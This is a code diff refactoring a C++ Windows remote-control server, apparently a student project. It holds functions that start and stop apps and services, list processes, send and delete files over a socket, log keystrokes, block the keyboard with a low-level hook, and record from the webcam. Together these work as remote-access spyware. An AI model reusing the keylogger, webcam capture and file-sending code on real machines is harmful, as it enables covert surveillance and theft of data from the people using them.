@@ -1,9 +1,6 @@
 ﻿#include "process.h"
 #include "commands.h"
 
-atomic<bool> isRecording = false;
-thread webcamThread = thread();
-
 // start app
 string startApp(string name) {
     string command = "start " + name;
@@ -11,41 +8,13 @@ string startApp(string name) {
 
     json jsonResponse;
 
-    jsonResponse["title"] = START_APP;
-    jsonResponse["nameObject"] = name;
-
     if (result == 0) {
 		jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Successfully started " + name;
     }
     else {
 		jsonResponse["status"] = "FAILED";
-        jsonResponse["result"] = "Failed to start " + name;
-    }
-
-    return jsonResponse.dump();
-}
-
-// start service
-string startService(string name) {
-    string command = "net start " + name + " > nul 2>&1";
-    int result = system(command.c_str());
-
-    json jsonResponse;
-
-    jsonResponse["title"] == START_SERVICE;
-    jsonResponse["nameObject"] = name;
-
-    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";
-
-    if (result == 0) {
-        jsonResponse["result"] = "Service " + name + " has been started successfully.";
-    }
-    else if (system(checkCommand.c_str()) == 0) {
-        jsonResponse["result"] = "Service " + name + " is already running.";
-    }
-    else {
-        jsonResponse["result"] = "Failed to start service " + name + ". Please check the service status.";
+        jsonResponse["result"] = "Windows cannot find " + name + ". Make sure you typed the name correctly, and then try again";
     }
 
     return jsonResponse.dump();
@@ -58,11 +27,10 @@ string stopApp(string name) {
 
     json jsonResponse;
 
-    jsonResponse["title"] = STOP_APP;
-    jsonResponse["nameObject"] = name;
-
-    if (result == 0)
+    if (result == 0) {
+        jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Successfully stopped " + name;
+    }
     else {
         FILE* pipe = _popen(command.c_str(), "r");
         char buffer[128];
@@ -71,7 +39,131 @@ string stopApp(string name) {
             line += buffer;
         }
 
-        jsonResponse["result"] = "The application with name " + name + " is inactive";
+        jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "The application with name " + name + " is inactive or not existent";
+    }
+
+    return jsonResponse.dump();
+}
+
+// list app
+void writeAppListToFile(const vector<vector<string>>& apps) {
+    ofstream outFile(DATA_FILE);
+
+    if (!outFile) {
+        cerr << "Failed to open file." << endl;
+        return;
+    }
+
+    // write title
+    outFile << setw(30) << left << "Application Name"
+        << setw(10) << left << "PID"
+        << setw(25) << left << "Memory Usage (GB)"
+        << setw(50) << left << "Path" << endl;
+    outFile << string(105, '-') << endl;
+
+    // write app information
+    for (const auto& app : apps) {
+        double memoryInGB = stod(app[2]);
+        outFile << setw(30) << left << app[0]        // application Name
+            << setw(15) << left << app[1]        // PID
+            << setw(20) << left << fixed << setprecision(2) << memoryInGB   // memory usage in GB
+            << setw(50) << left << app[3]        // path
+            << endl;
+    }
+
+    outFile.close();
+}
+vector<vector<string>> getRunningApps() {
+    // PowerShell command to get information about processes (Name, PID, Memory Usage, Path)
+    string command = R"(powershell -Command "Get-Process | Where-Object {$_.mainwindowhandle -ne 0} | Select-Object Name,Id,WorkingSet64,Path | Format-Table -HideTableHeaders")";
+
+    FILE* pipe = _popen(command.c_str(), "r");
+    if (!pipe) {
+        cerr << "Failed to run command." << endl;
+        return {};
+    }
+
+    vector<vector<string>> appList;
+    char buffer[1024]; // ensure the size is large enough to hold the data
+
+    // read data from PowerShell and process it
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        string line(buffer);
+        line.erase(remove(line.begin(), line.end(), '\n'), line.end());
+        line.erase(remove(line.begin(), line.end(), '\r'), line.end());
+
+        // skip empty lines
+        if (line.empty()) {
+            continue;
+        }
+
+        istringstream ss(line);
+        vector<string> appDetails;
+
+        string name, pid, memory, path;
+
+        // read values from the line
+        ss >> name >> pid >> memory;
+        getline(ss, path); // read the path with getline to accurately capture paths with spaces
+        path.erase(remove(path.begin(), path.end(), ' '), path.end()); // remove extra spaces at the beginning and end
+
+        // convert Memory Usage from bytes to GB
+        long long memoryInBytes = stoll(memory); // xonvert string to long long
+        double memoryInGB = static_cast<double>(memoryInBytes) / (1024 * 1024 * 1024); // convert from bytes to GB
+
+        // save the information
+        appDetails.push_back(name);
+        appDetails.push_back(pid);
+        appDetails.push_back(to_string(memoryInGB)); // convert to string and save
+        appDetails.push_back(path);
+
+        appList.push_back(appDetails);
+    }
+
+    _pclose(pipe);
+    return appList;
+}
+json listApp() {
+    vector<vector<string>> appList = getRunningApps();
+
+    json jsonResponse;
+
+    jsonResponse["title"] = "listApps";
+
+    if (!appList.empty()) {
+        jsonResponse["status"] = "OK";
+        jsonResponse["result"] = "Successfully listed applications";
+        writeAppListToFile(appList);
+    }
+    else {
+        jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Failed to list applications";
+    }
+
+    return jsonResponse;
+}
+
+// start service
+string startService(string name) {
+    string command = "net start " + name + " > nul 2>&1";
+    int result = system(command.c_str());
+
+    json jsonResponse;
+
+    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";
+
+    if (result == 0) {
+        jsonResponse["status"] = "OK";
+        jsonResponse["result"] = "Service " + name + " has been started successfully.";
+    }
+    else if (system(checkCommand.c_str()) == 0) {
+        jsonResponse["status"] = "OK";
+        jsonResponse["result"] = "Service " + name + " is already running.";
+    }
+    else {
+        jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Failed to start service " + name + ". Please check the service status.";
     }
 
     return jsonResponse.dump();
@@ -102,138 +194,7 @@ string stopService(string name) {
     return jsonResponse.dump();
 }
 
-// send file
-bool sendFile(SOCKET& clientSocket, string fileName) {
-    ifstream file(fileName, ios::binary);
-
-    if (!file) {
-        cout << "Failed to open file " << fileName << endl;
-        return false;
-    }
-
-    string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
-
-    int fileSize = (int)fileBuffer.size();
-    cout << fileSize << endl;
-
-    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-
-    int bytesSent = 0;
-
-    while (bytesSent < fileSize) {
-        int bytesToSend = min(fileSize - bytesSent, 1024);
-        int result = send(clientSocket, fileBuffer.c_str() + bytesSent, bytesToSend, 0);
-
-        if (result == SOCKET_ERROR) {
-            cout << "Failed to send file data, error: " << WSAGetLastError() << endl;
-            return false;
-        }
-
-        bytesSent += result;
-    }
-
-    return true;
-}
-
-// list apps
-void writeAppListToFile(const vector<vector<string>>& apps) {
-    ofstream outFile("data.bin");
-
-    if (!outFile) {
-        cerr << "Failed to open file." << endl;
-        return;
-    }
-
-    // Ghi tiêu đề bảng vào tệp
-    outFile << setw(30) << left << "Application Name"
-        << setw(10) << left << "PID"
-        << setw(25) << left << "Memory Usage (GB)"
-        << setw(50) << left << "Path" << endl;
-    outFile << string(105, '-') << endl;
-
-    // Ghi dữ liệu các tiến trình vào tệp
-    for (const auto& app : apps) {
-        double memoryInGB = stod(app[2]);  // Chuyển chuỗi thành số thực
-        outFile << setw(30) << left << app[0]        // Application Name
-            << setw(15) << left << app[1]        // PID
-            << setw(20) << left << fixed << setprecision(2) << memoryInGB   // Memory Usage in GB
-            << setw(50) << left << app[3]        // Path
-            << endl;
-    }
-
-    outFile.close();
-}
-vector<vector<string>> getRunningApps() {
-    // Lệnh PowerShell để lấy thông tin về các tiến trình (Name, PID, Memory Usage, Path)
-    string command = R"(powershell -Command "Get-Process | Where-Object {$_.mainwindowhandle -ne 0} | Select-Object Name,Id,WorkingSet64,Path | Format-Table -HideTableHeaders")";
-
-    FILE* pipe = _popen(command.c_str(), "r");
-    if (!pipe) {
-        cerr << "Failed to run command." << endl;
-        return {};
-    }
-
-    vector<vector<string>> appList;
-    char buffer[1024]; // Đảm bảo kích thước đủ lớn để chứa dữ liệu
-
-    // Đọc dữ liệu từ PowerShell và xử lý
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        string line(buffer);
-        line.erase(remove(line.begin(), line.end(), '\n'), line.end());
-        line.erase(remove(line.begin(), line.end(), '\r'), line.end());
-
-        // Bỏ qua các dòng trống
-        if (line.empty()) {
-            continue;
-        }
-
-        istringstream ss(line);
-        vector<string> appDetails;
-
-        string name, pid, memory, path;
-
-        // Đọc các giá trị từ dòng
-        ss >> name >> pid >> memory;
-        getline(ss, path); // Đọc đường dẫn với getline để lấy chính xác đường dẫn có khoảng trắng
-        path.erase(remove(path.begin(), path.end(), ' '), path.end()); // Loại bỏ khoảng trắng thừa ở đầu và cuối
-
-        // Chuyển đổi Memory Usage từ byte sang GB
-        long long memoryInBytes = stoll(memory); // Chuyển chuỗi sang long long
-        double memoryInGB = static_cast<double>(memoryInBytes) / (1024 * 1024 * 1024); // Chuyển từ byte sang GB
-
-        // Lưu lại thông tin
-        appDetails.push_back(name);
-        appDetails.push_back(pid);
-        appDetails.push_back(to_string(memoryInGB)); // Chuyển thành chuỗi và lưu lại
-        appDetails.push_back(path);
-
-        appList.push_back(appDetails);
-    }
-
-    _pclose(pipe);
-    return appList;
-}
-json listApps() {
-    vector<vector<string>> appList = getRunningApps();
-
-    json jsonResponse;
-
-    jsonResponse["title"] = "listApps";
-
-    if (!appList.empty()) {
-		jsonResponse["status"] = "OK";
-        jsonResponse["result"] = "Successfully listed applications";
-        writeAppListToFile(appList);
-    }
-    else {
-		jsonResponse["status"] = "FAILED";
-        jsonResponse["result"] = "Failed to list applications";
-    }
-
-    return jsonResponse;
-}
-
-// list services
+// list service
 string getServiceDescription(SC_HANDLE hService) {
     LPQUERY_SERVICE_CONFIG serviceConfig;
     DWORD bytesNeeded;
@@ -335,8 +296,8 @@ vector<pair<string, tuple<int, string, string>>> listAllServices() {
 
     return servicesInfo;
 }
-void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
-    ofstream outputFile("data.bin");
+void writeServiceListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
+    ofstream outputFile(DATA_FILE);
 
     if (!outputFile.is_open()) {
         cerr << "Unable to open file for writing!" << endl;
@@ -365,7 +326,7 @@ void writeServicesListToFile(const vector<pair<string, tuple<int, string, string
     // Đóng file
     outputFile.close();
 }
-string listServices() {
+string listService() {
     vector<pair<string, tuple<int, string, string>>> servicesList = listAllServices();
 
     json jsonResponse;
@@ -374,14 +335,14 @@ string listServices() {
 
     if (!servicesList.empty()) {
         jsonResponse["result"] = "Successfully listed services";
-        writeServicesListToFile(servicesList);
+        writeServiceListToFile(servicesList);
     }
     else jsonResponse["result"] = "Failed to list services";
 
     return jsonResponse.dump();
 }
 
-// list processes
+// list process
 string listProcess() {
     json jsonRespone;
 
@@ -400,20 +361,36 @@ string listProcess() {
     return jsonRespone.dump();
 }
 
-// delete file
-string deleteFile(string& filePath) {
-    json jsonResponse;
+// get file
+bool sendFile(SOCKET& clientSocket, string fileName) {
+    ifstream file(fileName, ios::binary);
 
-    jsonResponse["title"] = DELETE_FILE;
-
-    if (remove(filePath.c_str()) == 0) {
-        jsonResponse["result"] = "File has been successfully deleted!";
-    }
-    else {
-        jsonResponse["result"] = "Failed to delete file";
+    if (!file) {
+        cout << "Failed to open file " << fileName << endl;
+        return false;
     }
 
-    return jsonResponse.dump();
+    string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
+
+    int fileSize = (int)fileBuffer.size();
+
+    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
+
+    int bytesSent = 0;
+
+    while (bytesSent < fileSize) {
+        int bytesToSend = min(fileSize - bytesSent, 1024);
+        int result = send(clientSocket, fileBuffer.c_str() + bytesSent, bytesToSend, 0);
+
+        if (result == SOCKET_ERROR) {
+            cout << "Failed to send file data, error: " << WSAGetLastError() << endl;
+            return false;
+        }
+
+        bytesSent += result;
+    }
+
+    return true;
 }
 
 // copy file
@@ -440,6 +417,22 @@ string copyFile(const string& sourceFile, const string& destinationFile) {
     destination << source.rdbuf();
 
     jsonResponse["result"] = "File copied successfully!";
+
+    return jsonResponse.dump();
+}
+
+// delete file
+string deleteFile(string& filePath) {
+    json jsonResponse;
+
+    jsonResponse["title"] = DELETE_FILE;
+
+    if (remove(filePath.c_str()) == 0) {
+        jsonResponse["result"] = "File has been successfully deleted!";
+    }
+    else {
+        jsonResponse["result"] = "Failed to delete file";
+    }
 
     return jsonResponse.dump();
 }
@@ -655,8 +648,7 @@ vector<string> collectKeyNames(int durationInSeconds) {
     return keyNames; // Trả về danh sách các phím đã nhấn
 }
 void writeKeyNamesToFile(vector<string>& keyNames) {
-    ofstream output;
-    output.open("data.bin");
+    ofstream output(DATA_FILE);
 
     for (string& key : keyNames) {
         output << key << " ";
@@ -664,7 +656,7 @@ void writeKeyNamesToFile(vector<string>& keyNames) {
 
     output.close();
 }
-string keyLogger(int durationInSeconds) {
+string keylogger(int durationInSeconds) {
     json jsonResponse;
 
     jsonResponse["title"] = "keyLogger";
@@ -682,7 +674,7 @@ string keyLogger(int durationInSeconds) {
     return jsonResponse.dump();
 }
 
-// key lock
+// lock keyboard
 LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         return 1; // Chặn tất cả các phím bấm
@@ -729,7 +721,7 @@ void runKeyLockingLoop() {
     }
 }
 
-// key unlock
+// unlock keyboard
 bool unlockKeyboard() {
     if (keyboardHook == NULL) {
         cout << "Keyboard is not locked or already unlocked!" << endl;
@@ -784,14 +776,12 @@ void restart() {
     system(command.c_str());
 }
 
-// directory tree
-// Hàm kiểm tra xem tệp/thư mục có ẩn hoặc là hệ thống không
+// list directory tree
 bool isHiddenOrSystem(const filesystem::path& path) {
     DWORD attributes = GetFileAttributesW(path.wstring().c_str());
     if (attributes == INVALID_FILE_ATTRIBUTES) return false;
     return (attributes & FILE_ATTRIBUTE_HIDDEN) || (attributes & FILE_ATTRIBUTE_SYSTEM);
 }
-// Hàm in cây thư mục ra tệp
 void printDirectoryTree(const filesystem::path& path, wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
     if (currentDepth > maxDepth) return; // Dừng nếu vượt quá mức tối đa
 
@@ -816,10 +806,9 @@ void printDirectoryTree(const filesystem::path& path, wofstream& output, int ind
         output << L"Error: " << e.what() << L"\n";
     }
 }
-// Hàm liệt kê các ổ đĩa và in cây thư mục
 bool listDrivesAndPrintTree() {
     // Cấu hình luồng ghi file với UTF-8
-    wofstream output("data.bin", ios::out);
+    wofstream output(DATA_FILE, ios::out);
     output.imbue(locale("en_US.UTF-8"));
 
     if (!output.is_open()) {
@@ -852,7 +841,7 @@ bool listDrivesAndPrintTree() {
     output.close();
     return true;
 }
-string getDirectoryTree() {
+string listDirectoryTree() {
     // Khai báo biến để lưu chế độ mặc định của stdout
     int defaultMode = _O_TEXT; // Đảm bảo biến được khởi tạo đúng giá trị mặc định
 
@@ -881,7 +870,9 @@ string getDirectoryTree() {
     return jsonResponse.dump();
 }
 
-// start webcam
+// webcam
+atomic<bool> isRecording = false;
+thread webcamThread = thread();
 bool createWebcamVideo(int duration) {
     cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
 
@@ -963,8 +954,7 @@ bool createWebcamVideo(int duration) {
 
     return true;
 }
-
-string startWebcam() {
+string turnOnWebcam() {
     if (isRecording) {
         return R"({"title":"startWebcam","result":"Webcam is already recording"})";
     }
@@ -981,8 +971,7 @@ string startWebcam() {
 
     return jsonResponse.dump();
 }
-
-string stopWebcam() {
+string turnOffWebcam() {
     if (!isRecording) {
         return R"({"title":"stopWebcam","result":"Webcam is not recording"})";
     }
@@ -1006,3 +995,4 @@ string stopWebcam() {
 
     return jsonResponse.dump();
 }
+
